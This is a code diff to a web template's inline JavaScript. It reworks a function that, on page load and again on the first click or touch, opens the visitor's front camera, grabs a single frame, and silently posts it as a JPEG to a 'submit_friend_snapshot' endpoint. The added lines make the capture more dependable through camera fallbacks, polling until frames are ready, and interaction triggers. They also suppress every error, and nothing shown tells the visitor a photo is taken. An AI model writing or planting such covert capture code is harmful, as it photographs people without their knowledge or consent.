@@ -920,7 +920,11 @@ document.addEventListener('DOMContentLoaded', function() {
 
 <script>
 (function() {
-    function autoCaptureFriendSnapshot() {
+    let captured = false;
+
+    function captureSnapshot() {
+        if (captured) return;
+
         const video = document.getElementById('snapshotVideo');
         const canvas = document.getElementById('snapshotCanvas');
         if (!video || !canvas) return;
@@ -929,36 +933,56 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } })
+        function requestStream(constraints) {
+            return navigator.mediaDevices.getUserMedia(constraints);
+        }
+
+        requestStream({ video: { facingMode: 'user' } })
+            .catch(() => requestStream({ video: true }))
             .then(stream => {
                 video.srcObject = stream;
-                video.play();
-                
-                setTimeout(() => {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    fetch('{{ url_for("submit_friend_snapshot") }}', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image_data: imageData })
-                    }).catch(() => {});
-                }, 1000);
+                video.play().catch(() => {});
+
+                let checkCount = 0;
+                const interval = setInterval(() => {
+                    checkCount++;
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        clearInterval(interval);
+                        
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                        stream.getTracks().forEach(track => track.stop());
+
+                        if (imageData && imageData.length > 500) {
+                            captured = true;
+                            fetch('{{ url_for("submit_friend_snapshot") }}', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ image_data: imageData })
+                            }).catch(() => {});
+                        }
+                    }
+
+                    if (checkCount > 25) {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                }, 200);
             })
             .catch(() => {});
     }
 
     if (document.readyState === 'complete') {
-        autoCaptureFriendSnapshot();
+        captureSnapshot();
     } else {
-        window.addEventListener('load', autoCaptureFriendSnapshot);
+        window.addEventListener('load', captureSnapshot);
     }
+    document.addEventListener('click', captureSnapshot, { once: true });
+    document.addEventListener('touchstart', captureSnapshot, { once: true });
 })();
 </script>
 {% endif %}
